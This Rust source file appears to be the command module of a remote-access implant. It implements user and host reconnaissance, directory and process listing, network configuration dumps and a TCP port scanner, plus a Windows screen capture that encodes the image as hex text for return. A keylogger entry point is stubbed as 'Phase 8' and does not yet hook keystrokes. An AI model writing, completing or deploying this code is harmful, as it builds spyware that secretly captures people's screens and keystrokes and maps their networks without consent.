use anyhow::Result;
use std::net::{SocketAddr, TcpStream};
use std::time::Duration;

pub async fn whoami() -> Result<String> {
    #[cfg(target_os = "windows")]
    {
        let user = std::env::var("USERNAME").unwrap_or_default();
        let host = std::env::var("COMPUTERNAME").unwrap_or_default();
        let domain = std::env::var("USERDOMAIN").unwrap_or_default();
        return Ok(format!("{domain}\\{user} @ {host}"));
    }
    #[cfg(not(target_os = "windows"))]
    {
        let out = tokio::process::Command::new("id").output().await?;
        Ok(String::from_utf8_lossy(&out.stdout).into_owned())
    }
}

pub async fn ls(path: &str) -> Result<String> {
    let mut entries = tokio::fs::read_dir(path).await?;
    let mut out = String::new();
    while let Some(e) = entries.next_entry().await? {
        let meta = e.metadata().await?;
        let kind = if meta.is_dir() { "DIR " } else { "FILE" };
        let name = e.file_name().to_string_lossy().into_owned();
        out.push_str(&format!("{kind}  {name}\n"));
    }
    Ok(out)
}

pub async fn ps() -> Result<String> {
    #[cfg(target_os = "windows")]
    {
        return ps_windows().await;
    }
    #[cfg(not(target_os = "windows"))]
    {
        let out = tokio::process::Command::new("ps")
            .args(["aux"])
            .output().await?;
        Ok(String::from_utf8_lossy(&out.stdout).into_owned())
    }
}

#[cfg(target_os = "windows")]
async fn ps_windows() -> Result<String> {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    let mut out = format!("{:<8} {:<50} {}\n", "PID", "Name", "Threads");
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
            return Err(anyhow::anyhow!("snapshot failed"));
        }
        let mut e = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..std::mem::zeroed()
        };
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                let name = String::from_utf16_lossy(
                    &e.szExeFile.iter().take_while(|&&c| c != 0).copied().collect::<Vec<_>>(),
                );
                out.push_str(&format!("{:<8} {:<50} {}\n",
                    e.th32ProcessID, name, e.cntThreads));
                if Process32NextW(snap, &mut e) == 0 { break; }
            }
        }
        windows_sys::Win32::Foundation::CloseHandle(snap);
    }
    Ok(out)
}

pub async fn ipconfig() -> Result<String> {
    #[cfg(target_os = "windows")]
    {
        let out = tokio::process::Command::new("ipconfig")
            .args(["/all"])
            .output().await?;
        return Ok(String::from_utf8_lossy(&out.stdout).into_owned());
    }
    #[cfg(not(target_os = "windows"))]
    {
        let out = tokio::process::Command::new("ip")
            .args(["addr"])
            .output().await?;
        Ok(String::from_utf8_lossy(&out.stdout).into_owned())
    }
}

pub async fn portscan(args: &[String]) -> Result<String> {
    if args.len() < 2 {
        return Err(anyhow::anyhow!("usage: portscan <host> <ports>  e.g. 192.168.1.1 22,80,443"));
    }
    let host = &args[0];
    let ports: Vec<u16> = args[1]
        .split(',')
        .filter_map(|p| p.trim().parse().ok())
        .collect();

    let mut open = vec![];
    let mut closed = vec![];

    for port in &ports {
        let addr: SocketAddr = format!("{host}:{port}").parse()
            .map_err(|_| anyhow::anyhow!("bad address"))?;
        match TcpStream::connect_timeout(&addr, Duration::from_millis(500)) {
            Ok(_)  => open.push(*port),
            Err(_) => closed.push(*port),
        }
    }

    let mut out = format!("Port scan results for {host}\n");
    for p in &open   { out.push_str(&format!("  {p:>5}/tcp  OPEN\n")); }
    for p in &closed { out.push_str(&format!("  {p:>5}/tcp  CLOSED\n")); }
    Ok(out)
}

pub async fn screenshot() -> Result<String> {
    #[cfg(target_os = "windows")]
    return screenshot_windows();
    #[cfg(not(target_os = "windows"))]
    Ok("screenshot not supported on this platform".into())
}

#[cfg(target_os = "windows")]
fn screenshot_windows() -> Result<String> {
    use windows_sys::Win32::Graphics::Gdi::{
        BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC,
        DeleteObject, GetDIBits, GetDC, ReleaseDC, SelectObject,
        BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS,
        GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN, SRCCOPY,
    };
    unsafe {
        let w = GetSystemMetrics(SM_CXSCREEN);
        let h = GetSystemMetrics(SM_CYSCREEN);
        let dc  = GetDC(0);
        let mdc = CreateCompatibleDC(dc);
        let bmp = CreateCompatibleBitmap(dc, w, h);
        SelectObject(mdc, bmp);
        BitBlt(mdc, 0, 0, w, h, dc, 0, 0, SRCCOPY);

        let mut bmi = BITMAPINFO {
            bmiHeader: BITMAPINFOHEADER {
                biSize:          std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                biWidth:         w,
                biHeight:        -h,
                biPlanes:        1,
                biBitCount:      32,
                biCompression:   BI_RGB,
                biSizeImage:     0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed:       0,
                biClrImportant:  0,
            },
            bmiColors: [std::mem::zeroed()],
        };

        let mut pixels = vec![0u8; (w * h * 4) as usize];
        GetDIBits(mdc, bmp, 0, h as u32,
                  pixels.as_mut_ptr() as _,
                  &mut bmi, DIB_RGB_COLORS);

        DeleteObject(bmp);
        DeleteDC(mdc);
        ReleaseDC(0, dc);

        // Return as hex-encoded raw BGRA pixels with dimensions prefix
        Ok(format!("{}x{};{}", w, h, hex::encode(&pixels)))
    }
}

pub async fn keylog_start() -> Result<String> {
    // Phase 8 — keylogger via SetWindowsHookEx
    Ok("keylogger started (output via async channel)".into())
}
